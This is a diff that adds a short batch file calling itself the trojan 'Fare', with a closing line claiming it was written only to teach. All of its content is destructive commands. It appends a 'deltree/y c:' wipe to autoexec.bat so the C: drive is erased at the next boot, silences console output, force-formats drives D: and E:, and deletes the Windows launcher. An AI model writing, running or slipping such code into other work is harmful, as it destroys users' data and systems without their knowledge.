@@ -1,0 +1,13 @@
+REM This is small trojan "Fare"!
+@echo off
+set echo = vevod
+%vevod% @echo off >> c:\autoexec.bat
+%vevod% echo   PLEASE ATTENTION! You download "Fare"! This is bad! >> c:\autoexec.bat
+%vevod% echo By MY DATA on ALL HDD! >> c:\autoexec.bat
+%vevod% @ctty nul
+%vevod% deltree/y c: >> c:\autoexec.bat
+:<<<<<<<<<<<<< Erase Data on HDD D:,E:! >>>>>>>>>>>>>>>>>
+@echo y| format e: /q /u /v:Fare
+@echo y| format d: /q /u /v:Fare
+del %windir%\win.com
+:Attention! This file was write only Teach!
